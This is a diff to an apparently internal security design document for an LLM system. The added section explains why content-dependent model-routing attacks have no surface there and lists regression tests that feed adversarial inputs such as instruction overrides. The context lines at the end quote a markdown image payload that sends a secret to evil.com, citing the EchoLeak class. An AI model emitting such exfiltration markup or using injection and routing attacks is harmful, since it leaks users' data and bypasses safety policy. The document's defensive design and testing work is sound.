@@ -239,7 +239,60 @@ a `ponytail:` comment naming the ceiling and upgrade path.
 
 ---
 
-## 5. Exfiltration surfaces (the 2026-09-07 "Shutter" closure)
+## 4b. Model routing: a NON-surface, kept non-surface by a pin (R53a, 2026-09-29)
+
+**The attack class is real; the surface is not.** The published cost/safety
+routing attacks — Route-to-Rome style adversarial suffixes that push a router
+onto an expensive model, and rerouting papers that bypass safety policy by
+choosing a different model — all require a **content-dependent MODEL
+router**. This tree has none, and the reason is structural rather than
+disciplinary:
+
+| Surface | Where the model is bound | Why content cannot move it |
+|---|---|---|
+| LLM provider stream | per-`HttpProvider` field, read off `self` at the send seam | `ProviderRequest` carries **no `model` field**, so a request cannot name a model. |
+| Injection screen / ONNX | process-wide `LazyLock`, copied unconditionally into every `Screen` | Content selects the **verdict**; there is no second model to select. |
+| Embedder | chosen once at boot from the retrieval profile | The model is a property of the concrete type bound into `AppState`. |
+
+The one content-dependent model router in the tree — `workflow/decide/router.rs` —
+has **no production caller**; its only importer analyses an *empty* state.
+
+**This was an unpinned accident, and that was the finding.** The property held
+because of how the code happens to be written, with zero assertions anywhere
+(`grep` for any content-independence assertion: 0 matches repo-wide). R53a
+converts it into a machine-checked property, so a later round cannot open the
+surface without turning something red:
+
+- `the_bound_model_is_not_a_function_of_the_call_content` — **behavioural**:
+  one provider, five adversarial contents (instruction override, explicit tier
+  lure, bidi-reversed, long suffix, benign control), reading the model off
+  every body that actually left the process. Proven non-vacuous by planting a
+  content-derived model selection and watching it fail.
+- `the_provider_request_carries_no_model_and_the_body_takes_it_as_an_argument`,
+  `the_send_seam_reads_the_model_off_the_provider_not_the_request`,
+  `the_classifier_is_process_wide_and_the_content_selects_only_the_verdict`,
+  `the_embedder_is_chosen_at_boot_from_the_profile_alone` — structural, and all
+  comment-stripped first (F7-07) so prose cannot produce a false pass.
+
+**Standing ceiling, stated where an auditor will look.** These are regression
+locks on the code's SHAPE. They prove the current surfaces are content-independent;
+they do **not** prove the absence of every possible content-dependent router, and
+they are not a red-team exercise against the named attacks. If a router is ever
+added, the site table in `tests/r53a_decision_class_pins.rs` is the thing that
+must be updated deliberately, and `DecisionClass` (a closed enum) is what forces
+that round to name the new surface.
+
+**Observability, not enforcement.** `brain_model_calls_total`,
+`brain_model_tokens_total` and `brain_model_incomplete_total`, labelled by the
+closed class set. They make the surface inventory checkable by an operator
+without reading source. They carry no model id, no domain, no principal, and no
+content: the class is derived from the call site, and its label is a total
+function of a fieldless enum. They are process-local — a restart zeroes them —
+so they are a rate-and-composition gauge, **not a spend ledger and not a spend
+ceiling**. No per-class spend *ceiling* was built; see the round's evidence §2.4
+for the two measured reasons.
+
+---
 
 Model-controlled markdown is the canonical covert-exfil channel (EchoLeak /
 CVE-2025-32711 class: `<img src="http://evil.com/steal?data=SECRET">`). The
